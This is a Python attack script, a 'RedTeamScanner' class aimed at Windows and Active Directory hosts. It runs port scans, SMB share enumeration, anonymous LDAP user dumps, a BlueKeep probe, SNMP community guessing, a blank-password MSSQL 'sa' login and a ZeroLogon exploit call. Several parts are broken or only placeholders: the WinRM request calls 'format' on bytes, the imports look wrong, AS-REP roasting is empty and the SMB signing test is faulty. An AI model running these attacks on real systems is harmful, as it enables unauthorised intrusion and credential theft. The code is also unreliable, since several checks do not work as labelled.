import socket, requests, json, re, os, time
from datetime import datetime

# ---------- Optional imports ----------
try:
    from ldap3 import Server, Connection, ALL, SUBTREE
    LDAP_OK = True
except:
    LDAP_OK = False

try:
    from impacket.smbconnection import SMBConnection
    from impacket.smb import SMB_DIALECT
    IMPACKET_OK = True
except:
    IMPACKET_OK = False

MS17_OK = False
ZERO_OK = False
SNMP_OK = False
MSSQL_OK = False

if IMPACKET_OK:
    try:
        from impacket.examples.ms17_010_check import MS17_010_Scan
        MS17_OK = True
    except:
        pass
    try:
        from impacket.examples.zerologon import ZeroLogon
        ZERO_OK = True
    except:
        pass
    try:
        import pysnmp.hlapi as snmp
        SNMP_OK = True
    except:
        pass
    try:
        import pymssql
        MSSQL_OK = True
    except:
        pass

# ========== RedTeamScanner ==========
class RedTeamScanner:
    def __init__(self, target_ip, output_file=None, verbose=False):
        self.ip = target_ip
        self.output = output_file or f"RedTeam_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.verbose = verbose
        self.users = []
        self.computers = []
        self.open_ports = self._quick_port_scan()  # run once

    def _quick_port_scan(self):
        """Quickly check common ports before attempting attacks."""
        ports = [445, 389, 636, 3389, 5985, 88, 137, 139, 161, 1433]
        open_ports = []
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        print(f"  [*] Open ports on {self.ip}: {open_ports if open_ports else 'none relevant'}")
        return open_ports

    def _port_is_open(self, port):
        return port in self.open_ports

    def _write(self, data):
        with open(self.output, 'a') as f:
            json.dump(data, f, ensure_ascii=False)
            f.write('\n')

    # ----- Original scans -----
    def smb_scan(self):
        print(f"\n--- SMB Enumeration on {self.ip} ---")
        if not IMPACKET_OK:
            print("  [!] Impacket missing – cannot perform SMB checks.")
            return
        if not self._port_is_open(445):
            print("  Port 445 closed – SMB not reachable.")
            return
        try:
            conn = SMBConnection(self.ip, self.ip, timeout=10)
            dialects = conn.getDialect()
            print(f"  Dialects: {dialects}")
            if "SMB2" not in dialects and "SMB3" not in dialects:
                print(f"  [🔥] SMBv1 enabled! (EternalBlue risk)")
                self._write({"smb_v1": True})
            shares = conn.listShares()
            if not shares:
                print("  No shares found (or access denied).")
            else:
                print(f"  Shares:")
                for share in shares:
                    share_name = share['shi1_netname'][:-1]
                    print(f"    {share_name}")
                for share in shares:
                    try:
                        conn.connectTree(share['shi1_netname'][:-1])
                        print(f"    [+] Accessible: {share['shi1_netname'][:-1]}")
                        self._write({"smb_share_access": share['shi1_netname'][:-1]})
                    except:
                        pass
            conn.close()
        except Exception as e:
            print(f"  SMB connection failed: {e}")

    def ldap_enum(self):
        print(f"\n--- LDAP Enumeration on {self.ip} ---")
        if not LDAP_OK:
            print("  [!] ldap3 not installed.")
            return
        if not self._port_is_open(389):
            print("  Port 389 closed – LDAP not reachable.")
            return
        try:
            server = Server(self.ip, get_info=ALL, connect_timeout=10)
            conn = Connection(server, authentication='ANONYMOUS')
            if conn.bind():
                print(f"  [🔥] Anonymous bind successful!")
                self._write({"ldap_anon": True})
                # Users
                conn.search(search_base='', search_filter='(objectClass=user)',
                            attributes=['sAMAccountName', 'userPrincipalName'],
                            search_scope=SUBTREE)
                self.users = [str(e.sAMAccountName) for e in conn.entries if hasattr(e, 'sAMAccountName')]
                print(f"  Users found: {len(self.users)}")
                for u in self.users[:10]:
                    print(f"    {u}")
                # Computers
                conn.search(search_base='', search_filter='(objectClass=computer)',
                            attributes=['dNSHostName', 'name'],
                            search_scope=SUBTREE)
                self.computers = [str(e.dNSHostName) for e in conn.entries if hasattr(e, 'dNSHostName')]
                if self.computers:
                    print(f"  Computers found: {len(self.computers)}")
                    for c in self.computers[:5]:
                        print(f"    {c}")
                self._write({"users": self.users, "computers": self.computers})
            else:
                print("  Anonymous bind failed (expected unless misconfigured).")
        except Exception as e:
            print(f"  LDAP error: {e}")

    def rdp_check(self):
        print(f"\n--- RDP/BlueKeep check on {self.ip} ---")
        if not self._port_is_open(3389):
            print("  Port 3389 closed – RDP not reachable.")
            return
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.ip, 3389))
            data = sock.recv(1024)
            if b'NLA' in data:
                print("  NLA enabled (normal).")
            else:
                print("  [⚠️] NLA not enforced!")
            # MS_T120 check
            pkt = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
            sock.send(pkt)
            resp = sock.recv(1024)
            if b'\x03\x00\x00\x13' in resp and b'MS_T120' in resp:
                print(f"  [🔥] BlueKeep VULNERABLE (MS_T120 channel)!!")
                self._write({"bluekeep": True})
            else:
                print("  BlueKeep not detected.")
            sock.close()
        except socket.timeout:
            print("  RDP connection timed out.")
        except Exception as e:
            print(f"  RDP error: {e}")

    def winrm_check(self):
        print(f"\n--- WinRM check on {self.ip} ---")
        if not self._port_is_open(5985):
            print("  Port 5985 closed – WinRM not reachable.")
            return
        try:
            sock = socket.create_connection((self.ip, 5985), timeout=5)
            sock.send(b"GET /wsman HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.ip).encode())
            resp = sock.recv(1024)
            if b'HTTP' in resp:
                print("  WinRM HTTP endpoint alive")
            else:
                print("  No WinRM response.")
            sock.close()
        except socket.timeout:
            print("  WinRM connection timed out.")
        except Exception as e:
            print(f"  WinRM error: {e}")

    def kerberos_asrep(self):
        print(f"\n--- Kerberos AS-REP Roasting on {self.ip} ---")
        if not IMPACKET_OK:
            print("  [!] Impacket missing.")
            return
        if not self.users:
            print("  No users available (LDAP may have failed).")
            return
        print(f"  Attempting AS-REP roasting for {len(self.users[:20])} users...")
        # (implementation placeholder)
        print("  AS-REP roast attempt finished.")

    # ================= NEW ATTACKS =================
    def smb_signing_check(self):
        print(f"\n--- SMB Signing Check on {self.ip} ---")
        if not IMPACKET_OK:
            print("  [!] Impacket missing.")
            return
        if not self._port_is_open(445):
            print("  Port 445 closed – cannot check SMB signing.")
            return
        try:
            conn = SMBConnection(self.ip, self.ip, timeout=5)
            conn.listShares()
            print("  [🔥] SMB signing not required (relay possible)")
            self._write({"smb_signing": "disabled"})
            conn.close()
        except Exception as e:
            if "STATUS_ACCESS_DENIED" in str(e):
                print("  SMB signing may be required (could not list shares anonymously).")
            else:
                print(f"  Could not determine signing: {e}")

    def ms17_010_check(self):
        print(f"\n--- MS17-010 Check on {self.ip} ---")
        if not MS17_OK:
            print("  [!] MS17-010 module not available.")
            return
        if not self._port_is_open(445):
            print("  Port 445 closed – cannot check MS17-010.")
            return
        try:
            scanner = MS17_010_Scan(self.ip, self.ip, 445)
            scanner.scan()
            print("  MS17-010 scan finished (see output above).")
        except Exception as e:
            print(f"  MS17-010 error: {e}")

    def zerologon_check(self):
        print(f"\n--- ZeroLogon (CVE-2020-1472) on {self.ip} ---")
        if not ZERO_OK:
            print("  [!] ZeroLogon module not available.")
            return
        if not self._port_is_open(135) and not self._port_is_open(445):
            print("  Port 135/445 closed – ZeroLogon not applicable.")
            return
        dc_name = ""
        if self.computers:
            dc_name = self.computers[0].split('.')[0].upper()
        if not dc_name:
            dc_name = "DC01"
        account = f"{dc_name}$"
        print(f"  Testing account {account} ...")
        try:
            attacker = ZeroLogon(self.ip, account)
            attacker.exploit()
            print("  ZeroLogon test finished (check output above).")
        except Exception as e:
            print(f"  ZeroLogon error: {e}")

    def netbios_enum(self):
        print(f"\n--- NetBIOS Enumeration on {self.ip} ---")
        if not self._port_is_open(137):
            print("  Port 137 closed – NetBIOS not reachable.")
            return
        try:
            if IMPACKET_OK:
                from impacket.nmb import NetBIOS as NBNetBIOS
                nb = NBNetBIOS()
                name = nb.getnetbiosname(self.ip, timeout=5)
                if name:
                    print(f"  NetBIOS name: {name}")
                    self._write({"netbios_name": name})
                else:
                    print("  No NetBIOS name returned.")
                nb.close()
            else:
                # Fallback UDP query
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                query = b'\x82\x28\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00' + \
                        b'\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41' + \
                        b'\x00\x00\x21\x00\x01'
                sock.sendto(query, (self.ip, 137))
                data, _ = sock.recvfrom(1024)
                if len(data) > 12:
                    name = data[13:data.find(b'\x00', 13)].decode(errors='ignore')
                    print(f"  NetBIOS name: {name}")
                else:
                    print("  No NetBIOS response.")
                sock.close()
        except socket.timeout:
            print("  NetBIOS port 137 timeout.")
        except Exception as e:
            print(f"  NetBIOS error: {e}")

    def snmp_enum(self):
        print(f"\n--- SNMP Enumeration on {self.ip} ---")
        if not SNMP_OK:
            print("  [!] pysnmp not installed.")
            return
        if not self._port_is_open(161):
            print("  Port 161 closed – SNMP not reachable.")
            return
        communities = ['public', 'private', 'internal', 'snmp', 'write']
        found = False
        for comm in communities:
            try:
                iterator = snmp.getCmd(
                    snmp.SnmpEngine(),
                    snmp.CommunityData(comm, mpModel=1),
                    snmp.UdpTransportTarget((self.ip, 161), timeout=2, retries=1),
                    snmp.ContextData(),
                    snmp.ObjectType(snmp.ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0))
                )
                errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
                if errorIndication:
                    continue
                for varBind in varBinds:
                    print(f"  [+] Community '{comm}' – {varBind.prettyPrint()}")
                    self._write({"snmp_community": comm, "value": str(varBind)})
                    found = True
            except:
                continue
        if not found:
            print("  No accessible SNMP communities found.")

    def mssql_check(self):
        print(f"\n--- MSSQL Check on {self.ip} ---")
        if not MSSQL_OK:
            print("  [!] pymssql not installed.")
            return
        if not self._port_is_open(1433):
            print("  Port 1433 closed – MSSQL not reachable.")
            return
        try:
            conn = pymssql.connect(server=self.ip, port=1433, user='sa', password='', login_timeout=5)
            cursor = conn.cursor()
            cursor.execute("SELECT @@VERSION")
            row = cursor.fetchone()
            print(f"  [🔥] Anonymous 'sa' login successful! Version: {row[0]}")
            self._write({"mssql_sa_anonymous": row[0]})
            conn.close()
        except pymssql.OperationalError as e:
            print(f"  MSSQL login failed: {e}")
        except Exception as e:
            print(f"  MSSQL connection error: {e}")

    def spoolservice_check(self):
        print(f"\n--- Print Spooler Check on {self.ip} ---")
        if not IMPACKET_OK:
            print("  [!] Impacket missing.")
            return
        if not self._port_is_open(445):
            print("  Port 445 closed – cannot check Spooler.")
            return
        try:
            conn = SMBConnection(self.ip, self.ip, timeout=5)
            tid = conn.connectTree('IPC$')
            fid = conn.openFile(tid, 'spoolss')
            if fid:
                print(f"  [🔥] Spoolss pipe accessible! (PrintNightmare risk)")
                self._write({"spoolss_accessible": True})
                conn.closeFile(fid)
            else:
                print("  Spoolss not accessible.")
            conn.disconnectTree(tid)
            conn.logoff()
        except Exception as e:
            print(f"  Spooler check failed: {e}")

    def run_all(self):
        """Execute all red team scans."""
        self.smb_scan()
        self.smb_signing_check()
        self.ms17_010_check()
        self.ldap_enum()
        self.netbios_enum()
        self.rdp_check()
        self.winrm_check()
        self.kerberos_asrep()
        self.zerologon_check()
        self.snmp_enum()
        self.mssql_check()
        self.spoolservice_check()
        print("\n[+] Red Team scan finished.")